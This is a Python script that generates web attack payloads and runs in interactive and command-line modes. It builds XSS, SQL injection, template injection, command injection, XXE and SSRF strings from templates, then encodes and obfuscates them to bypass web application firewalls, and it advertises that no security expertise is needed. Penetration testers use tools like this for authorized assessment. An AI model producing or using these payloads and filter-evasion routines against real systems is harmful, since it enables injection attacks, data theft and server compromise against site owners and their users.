#!/usr/bin/env python3
"""
WAF Payload Generator - Easy payload customization for users
Helps users create custom payloads without deep security knowledge
"""

import json
import base64
import urllib.parse
import sys

class PayloadGenerator:
    """Generate custom WAF bypass payloads based on user input"""
    
    def __init__(self):
        self.templates = {
            'xss': {
                'basic': '<script>alert("{input}")</script>',
                'img': '<img src=x onerror=alert("{input}")>',
                'svg': '<svg/onload=alert("{input}")>',
                'event': '<input onfocus=alert("{input}") autofocus>',
                'encoded': '<script>alert(String.fromCharCode({charcode}))</script>',
            },
            'sqli': {
                'union': "' UNION SELECT {input}--",
                'boolean': "' OR '1'='1' AND username='{input}",
                'time': "'; WAITFOR DELAY '00:00:{input}'--",
                'error': "' AND 1=CONVERT(int, '{input}')--",
            },
            'ssti': {
                'jinja2': '{{{{"{input}"}}}',
                'flask': '{{{{config.{input}}}}}',
                'mako': '${{"{input}"}}',
                'freemarker': '${{"{input}"}}',
            },
            'command': {
                'pipe': '| {input}',
                'semicolon': '; {input}',
                'backtick': '`{input}`',
                'dollar': '$({input})',
            },
            'xxe': {
                'basic': '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{input}">]><foo>&xxe;</foo>',
                'parameter': '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{input}">%xxe;]>',
            },
            'ssrf': {
                'http': 'http://{input}',
                'file': 'file://{input}',
                'gopher': 'gopher://{input}',
            }
        }
    
    def generate(self, attack_type, template_name, user_input):
        """Generate payload from template"""
        if attack_type not in self.templates:
            return None
        
        if template_name not in self.templates[attack_type]:
            return None
        
        template = self.templates[attack_type][template_name]
        
        # For encoded XSS, convert to char codes
        if template_name == 'encoded':
            charcode = ','.join(str(ord(c)) for c in user_input)
            return template.format(charcode=charcode)
        
        return template.format(input=user_input)
    
    def encode_payload(self, payload, encoding='url'):
        """Encode payload in various formats"""
        encodings = {
            'url': lambda p: urllib.parse.quote(p),
            'double_url': lambda p: urllib.parse.quote(urllib.parse.quote(p)),
            'base64': lambda p: base64.b64encode(p.encode()).decode(),
            'hex': lambda p: ''.join(f'\\x{ord(c):02x}' for c in p),
            'unicode': lambda p: ''.join(f'\\u{ord(c):04x}' for c in p),
        }
        
        if encoding not in encodings:
            return payload
        
        return encodings[encoding](payload)
    
    def obfuscate(self, payload, method='case'):
        """Obfuscate payload to bypass filters"""
        methods = {
            'case': lambda p: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p)),
            'comment': lambda p: p.replace(' ', '/**/'),
            'concat': lambda p: p.replace('alert', 'ale'+'rt'),
            'unicode_mix': lambda p: p.replace('a', '\\u0061').replace('e', '\\u0065'),
        }
        
        if method not in methods:
            return payload
        
        return methods[method](payload)
    
    def list_templates(self):
        """List all available templates"""
        print("\n📋 Available Payload Templates:\n")
        for attack_type, templates in self.templates.items():
            print(f"🎯 {attack_type.upper()}:")
            for name in templates.keys():
                print(f"   - {name}")
        print()

def interactive_mode():
    """Interactive payload generation"""
    gen = PayloadGenerator()
    
    print("=" * 60)
    print("🚀 WAF Payload Generator - Interactive Mode")
    print("=" * 60)
    print("\nEasily create custom payloads without security expertise!")
    print("Perfect for testing, learning, and authorized security research.\n")
    
    while True:
        print("\n" + "=" * 60)
        print("Main Menu:")
        print("1. Generate payload from template")
        print("2. Encode existing payload")
        print("3. Obfuscate payload")
        print("4. List all templates")
        print("5. Quick XSS generator")
        print("6. Quick SQLi generator")
        print("7. Exit")
        print("=" * 60)
        
        choice = input("\nSelect option (1-7): ").strip()
        
        if choice == '1':
            gen.list_templates()
            attack_type = input("Enter attack type (xss/sqli/ssti/command/xxe/ssrf): ").strip().lower()
            template_name = input("Enter template name: ").strip().lower()
            user_input = input("Enter your input/value: ").strip()
            
            payload = gen.generate(attack_type, template_name, user_input)
            if payload:
                print(f"\n✅ Generated Payload:\n{payload}")
            else:
                print("\n❌ Invalid attack type or template name")
        
        elif choice == '2':
            payload = input("Enter payload to encode: ").strip()
            print("\nEncoding options: url, double_url, base64, hex, unicode")
            encoding = input("Select encoding: ").strip().lower()
            
            encoded = gen.encode_payload(payload, encoding)
            print(f"\n✅ Encoded Payload:\n{encoded}")
        
        elif choice == '3':
            payload = input("Enter payload to obfuscate: ").strip()
            print("\nObfuscation methods: case, comment, concat, unicode_mix")
            method = input("Select method: ").strip().lower()
            
            obfuscated = gen.obfuscate(payload, method)
            print(f"\n✅ Obfuscated Payload:\n{obfuscated}")
        
        elif choice == '4':
            gen.list_templates()
        
        elif choice == '5':
            print("\n🎯 Quick XSS Generator")
            message = input("Enter alert message (default: 1): ").strip() or "1"
            print("\nXSS Variants:")
            print(f"1. Basic: <script>alert({message})</script>")
            print(f"2. IMG: <img src=x onerror=alert({message})>")
            print(f"3. SVG: <svg/onload=alert({message})>")
            print(f"4. Event: <input onfocus=alert({message}) autofocus>")
            print(f"5. Encoded: {gen.generate('xss', 'encoded', message)}")
        
        elif choice == '6':
            print("\n🎯 Quick SQLi Generator")
            table = input("Enter table name (default: users): ").strip() or "users"
            print("\nSQLi Variants:")
            print(f"1. Union: ' UNION SELECT * FROM {table}--")
            print(f"2. Boolean: ' OR '1'='1' AND table='{table}")
            print(f"3. Error: ' AND 1=CONVERT(int, '{table}')--")
            print(f"4. Comment: ' OR 1=1--")
        
        elif choice == '7':
            print("\n👋 Goodbye! Happy (authorized) testing!")
            break
        
        else:
            print("\n❌ Invalid choice. Please select 1-7.")

def cli_mode():
    """Command-line mode for scripting"""
    if len(sys.argv) < 4:
        print("Usage: python3 payload_generator.py <attack_type> <template> <input>")
        print("Example: python3 payload_generator.py xss basic 'test'")
        print("\nOr run without arguments for interactive mode")
        return
    
    gen = PayloadGenerator()
    attack_type = sys.argv[1]
    template = sys.argv[2]
    user_input = sys.argv[3]
    
    payload = gen.generate(attack_type, template, user_input)
    if payload:
        print(payload)
    else:
        print("Error: Invalid attack type or template")
        sys.exit(1)

if __name__ == '__main__':
    if len(sys.argv) > 1:
        cli_mode()
    else:
        interactive_mode()
